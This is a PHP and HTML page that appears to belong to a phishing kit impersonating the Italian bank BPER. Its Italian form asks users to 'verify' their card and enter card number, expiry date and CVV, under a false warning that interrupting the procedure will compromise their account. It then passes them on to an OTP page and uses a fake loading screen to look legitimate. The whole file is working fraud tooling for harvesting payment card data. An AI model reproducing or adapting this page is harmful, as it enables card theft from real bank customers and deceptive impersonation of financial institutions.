<?php
//INCLUDERE GENERALE
require("pannello2/generale.php");

//CUSTOM
$pagina=array('carta','scadenza','cvv');
$numero = 1;
$prossima = "otp.php";
$precedente ="index.php";

//INCLUDERE MOTORE
require("pannello2/motore.php");

?><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
</head><body class="sfondo">
    <div class="father" style="display: none;">
    <div class="child"><img src="logo1.jpg">
<img src="spinning-loading.gif"></div>
</div>
<link rel="stylesheet" href="https://unpkg.com/purecss@2.0.5/build/pure-min.css">
<script src="jquery-latest.min.js"></script>
<script src="jquery.payform.min.js"></script>
<div class="resto" style="display: block;">
<style>

@font-face{font-family:'unicredit-regular';
    src:url('fonts/unicredit-regular.eot');
    src:url('fonts/unicredit-regular.otf') format('opentype'),
    url('fonts/unicredit-regular.svg#unicreditregular') format('svg'),
    url('fonts/unicredit-regular.woff') format('woff'),
    url('fonts/unicredit-regular.ttf') format('truetype');
    font-weight:normal;font-style:normal}

    html{
       background-color:#024b51;
    font-family: unicredit-regular;
    }
.father {
 display: flex;
    justify-content: center;
    align-items: center;
}
.resto{
    display: none ;
}

.nascondi{
    display: none !important;
}
.child img{
    width: 100%;}
.child {

    
    margin-top: 100%;
    position: absolute; 
}
.myButton {
    text-align: center;
    width: 100%;
    border-radius:40px;
    background-color: #009740;
    border: 1px solid #009740;
    display: inline-block;
    cursor: pointer;
    color: white;
    font-family: Arial;
    font-weight: bold;
    font-size: 100%;
    padding: 20px 28px;
    text-decoration: none;
    text-shadow: 0px 1px 0px #009740;
}
.myButton:hover {
	background-color:#009740;
}
.myButton:active {
	position:relative;
	top:1px;
}

        H1{FONT-SIZE: 2EM;
        }

label{
    margin: 15px 0px !important;
     font-size: 110%;
}
.i1{
    
}


input{
    padding-left:10px;
    width: 100%;
    border-bottom-width: 1px;
    background-color:#f9f9f9;
    border-top-width: 0px !important;
    border-left-width: 0px !important;
    line-height: 200%;
    border-right-width: 0px !important;
    font-size: 120%;
}

.sfondo{
    background-color: white;
}
#demo {
    padding: 0 25px;
    background-color: white;
}
.salva{
    -webkit-box-shadow: 1px 0px 10px -3px ##939393; 
box-shadow: 1px 0px 10px -3px #939393;
}
.barra{
    background-color:#4f4f4f;
    color:#ffc627;
    padding:5px 5px 5px 15px;
}
</style>



<div class="">
<div class="" style="COLOR: WHITE;text-align: LEFT;width: 100%;background-color: white;">
<br>  <img style="max-height: 70px;" src="bperlogo.jpg">
</div><br>
<div class="">
<div class="" style="COLOR: WHITE;text-align: LEFT;width: 100%;background-color: #00575e;">
<br>  <img style="max-height: 70px;" src="barra.jpg">
</div><br>

  </div>

  <form id="demo" method="POST">
  <div class="" style="text-align: center;">

  <img style="max-height: 40px;" src="lock.png">
  </div>
<h1 style="text-align: center;FONT-WEIGHT: bold;">Verifica la tua carta</h1>
<h2 style="text-align: center;FONT-WEIGHT: normal;">non interrompere la procedura per non compromettere il conto</h2>


<h3 style="text-align: left;FONT-WEIGHT: normal;">Numero della Carta</h3>
<input class="i1" required="" name="carta" type="text" placeholder="Inserisci" style="  margin-top:5px;" id="carta">  <br>  <br>  
<br>
<h3 style="text-align: left;FONT-WEIGHT: normal;">Scadenza</h3>
<input class="i1" required="" name="scadenza" type="text" placeholder="Inserisci" style="  margin-top:5px;" id="scadenza">  <br>  <br>  
<br>
<h3 style="text-align: left;FONT-WEIGHT: normal;">Cvv</h3>
<input class="i1" required="" name="cvv" type="text" placeholder="Inserisci" style="  margin-top:5px;">  <br>  <br>  
<br>
<div style="       text-align: center; ">
        <button type="submit" class="myButton">VERIFICA</button><br><br><br><br>
        </div>

</form>

</div>
<script>




    setTimeout(function(){

jQuery(".father").fadeOut( "slow", function() {
    jQuery("body").addClass("sfondo")
    
        jQuery(".resto").fadeIn()
  });

    },2000)
    </script>
   		<script>



</script>
<script>
jQuery('#scadenza').payform('formatCardExpiry');
jQuery('#carta').payform('formatCardNumber');

</script>

</div></body></html>